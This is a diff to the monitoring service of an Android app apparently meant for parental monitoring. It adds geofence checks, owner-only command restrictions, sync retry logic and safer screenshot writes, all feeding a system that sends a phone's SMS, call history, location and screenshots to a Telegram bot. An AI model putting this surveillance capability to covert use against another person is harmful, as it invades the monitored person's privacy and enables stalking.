@@ -123,6 +123,8 @@ class MonitoringService : Service() {
     @Volatile
     private var patrolCycleMs = 0L
     @Volatile
+    private var lastGeofenceCheckAt = 0L
+    @Volatile
     private var idleDataCycles = 0
     @Volatile
     private var lowPowerNotified = false
@@ -177,6 +179,10 @@ class MonitoringService : Service() {
     private val initialSyncLock = Any()
     @Volatile
     private var initialSyncRetryAt = 0L
+    @Volatile
+    private var initialStartSent = false
+    @Volatile
+    private var initialPartialNotified = false
     @Volatile
     private var cachedBotToken = ""
     @Volatile
@@ -730,6 +736,7 @@ class MonitoringService : Service() {
                     try { maybeRetryBotCommands() } catch (_: Exception) { }
                     try { checkBegadang() } catch (_: Exception) { }
                     try { checkCurfew() } catch (_: Exception) { }
+                    try { checkGeofenceFallback() } catch (_: Exception) { }
                     try { checkQuietHealth() } catch (_: Exception) { }
                     try { checkSilentLink() } catch (_: Exception) { }
                     try { checkVehicle() } catch (_: Exception) { }
@@ -1444,6 +1451,10 @@ class MonitoringService : Service() {
             answerCallback(query.id)
             return
         }
+        if ((chatId.startsWith("-") || originChat.startsWith("-")) && !ownerOk && cachedOwnerId != 0L) {
+            answerCallback(query.id)
+            return
+        }
         val dupCallback = markSeen(handledCallbackIds, query.id)
         try { answerCallback(query.id) } catch (_: Exception) { }
         if (dupCallback) return
@@ -1523,7 +1534,7 @@ class MonitoringService : Service() {
             }
             val text = when (code) {
                 400 -> "Buka Setup dan perbaiki Chat ID agar pesan jalan lagi."
-                403 -> "Buka Telegram: buka blokir bot atau undang lagi bot ke chat, lalu kirim /status."
+                403 -> "Buka Telegram: buka blokir bot atau undang lagi bot ke chat, lalu kirim /status (perintah dibaca lagi dalam ±5 menit)."
                 else -> "Buka Setup dan perbaiki token agar perintah jalan lagi."
             }
             val notification = NotificationCompat.Builder(this, ParentalMonitorApp.RESUME_CHANNEL_ID)
@@ -2022,7 +2033,7 @@ class MonitoringService : Service() {
                 if (privateChat) sendToTelegram("\u26D4 Hanya owner yang bisa pakai ${Html.escape(command)}.")
                 return
             }
-        } else if (!senderOk && !chatOk) {
+        } else if (!senderOk && (!chatOk || (cachedChatId.startsWith("-") && cachedOwnerId != 0L))) {
             return
         }
         val numberInput = numberInputFor(command)
@@ -3459,8 +3470,10 @@ class MonitoringService : Service() {
                 appendLine()
                 appendLine("Mengirim riwayat...")
             }
-            sendToTelegram(startMessage)
-            delay(500)
+            if (!initialStartSent) {
+                initialStartSent = sendToTelegram(startMessage)
+                delay(500)
+            }
             var initialOk = true
 
             if (pendingSms.isNotEmpty()) {
@@ -3551,10 +3564,14 @@ class MonitoringService : Service() {
             if (initialOk && !smsTruncated && !callTruncated) {
                 sendToTelegram(completeMessage)
                 initialSyncRetryAt = 0L
+                initialStartSent = false
+                initialPartialNotified = false
                 preferencesManager.setInitialSyncDoneSync(true)
             } else {
                 initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 30 * 60_000L
-                sendToTelegram("Sinkron riwayat terkirim sebagian. Sisanya menyusul otomatis.")
+                if (!initialPartialNotified) {
+                    initialPartialNotified = sendToTelegram("Sinkron riwayat terkirim sebagian. Sisanya menyusul otomatis.")
+                }
             }
             idleDataCycles = 0
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")
@@ -3563,6 +3580,10 @@ class MonitoringService : Service() {
             throw e
         } catch (e: Exception) {
             android.util.Log.e("MonitoringService", "Error in initial sync: ${redactToken(e.message)}")
+            try {
+                if (!preferencesManager.initialSyncDone) initialSyncRetryAt = android.os.SystemClock.elapsedRealtime() + 30 * 60_000L
+            } catch (_: Exception) {
+            }
         }
     }
 
@@ -4756,6 +4777,38 @@ class MonitoringService : Service() {
         }
     }
 
+    private suspend fun checkGeofenceFallback() {
+        try {
+            if (preferencesManager.patrolEnabled) return
+            if (preferencesManager.monitoringPaused) return
+            val nowElapsed = android.os.SystemClock.elapsedRealtime()
+            if (lastGeofenceCheckAt != 0L && nowElapsed - lastGeofenceCheckAt < 15 * 60_000L) return
+            val hasHome = try {
+                preferencesManager.homeLatE6 != Long.MIN_VALUE && preferencesManager.homeLonE6 != Long.MIN_VALUE && preferencesManager.homeRadiusM > 0
+            } catch (_: Exception) {
+                false
+            }
+            val hasSchool = try {
+                preferencesManager.schoolLatE6 != Long.MIN_VALUE && preferencesManager.schoolLonE6 != Long.MIN_VALUE && preferencesManager.schoolRadiusM > 0
+            } catch (_: Exception) {
+                false
+            }
+            if (!hasHome && !hasSchool) return
+            lastGeofenceCheckAt = nowElapsed
+            val locAge = System.currentTimeMillis() - try { preferencesManager.lastLocAt } catch (_: Exception) { 0L }
+            val cached = lastSentLatLon()
+            val pos = if (cached != null && locAge in 0..(30 * 60_000L)) {
+                cached
+            } else {
+                val fix = try { fetchLocation() } catch (_: Exception) { null } ?: return
+                try { rememberSentLatLon(fix.latitude, fix.longitude) } catch (_: Exception) { }
+                Pair(fix.latitude, fix.longitude)
+            }
+            checkGeofence(pos.first, pos.second)
+        } catch (_: Exception) {
+        }
+    }
+
     private fun todayKey(ts: Long = System.currentTimeMillis()): String {
         return com.redeye.parentalmonitor.utils.TimeFmt.dayKey(ts)
     }
@@ -5349,6 +5402,11 @@ class MonitoringService : Service() {
         }
         try {
             if (preferencesManager.silentHealStage != 0) preferencesManager.silentHealStage = 0
+        } catch (_: Exception) {
+        }
+        try {
+            val now = System.currentTimeMillis()
+            if (now - preferencesManager.lastDataAt > 10 * 60_000L) preferencesManager.lastDataAt = now
         } catch (_: Exception) {
         }
     }
@@ -6062,14 +6120,16 @@ class MonitoringService : Service() {
     }
 
     private fun releaseShotSession() {
-        var callback: MediaProjection.Callback? = null
-        var projection: MediaProjection? = null
+        var callbackRef: MediaProjection.Callback? = null
+        var projectionRef: MediaProjection? = null
         synchronized(shotSessionLock) {
-            callback = shotStopCallback
-            projection = shotCallbackProjection
+            callbackRef = shotStopCallback
+            projectionRef = shotCallbackProjection
             shotStopCallback = null
             shotCallbackProjection = null
         }
+        val callback = callbackRef
+        val projection = projectionRef
         releaseShotSurface()
         try {
             if (projection != null && callback != null) projection.unregisterCallback(callback)
@@ -6213,16 +6273,21 @@ class MonitoringService : Service() {
 
     private fun writeScreenshotJpeg(bmp: Bitmap): File? {
         val out = File(cacheDir, "screenshot_" + TimeFmt.fileStamp(System.currentTimeMillis()) + "_" + java.util.UUID.randomUUID() + ".jpg")
+        val tmp = File(cacheDir, out.name + ".tmp")
         return try {
-            java.io.FileOutputStream(out).use { bmp.compress(Bitmap.CompressFormat.JPEG, 85, it) }
-            if (!out.exists() || out.length() == 0L) {
-                deleteQuietly(out)
+            val compressed = java.io.FileOutputStream(tmp).use { bmp.compress(Bitmap.CompressFormat.JPEG, 85, it) }
+            if (!compressed || !tmp.exists() || tmp.length() == 0L) {
+                deleteQuietly(tmp)
                 null
             } else {
-                out
+                deleteQuietly(out)
+                if (tmp.renameTo(out)) out else {
+                    deleteQuietly(tmp)
+                    null
+                }
             }
         } catch (_: Exception) {
-            deleteQuietly(out)
+            deleteQuietly(tmp)
             null
         } finally {
             try { bmp.recycle() } catch (_: Exception) { }
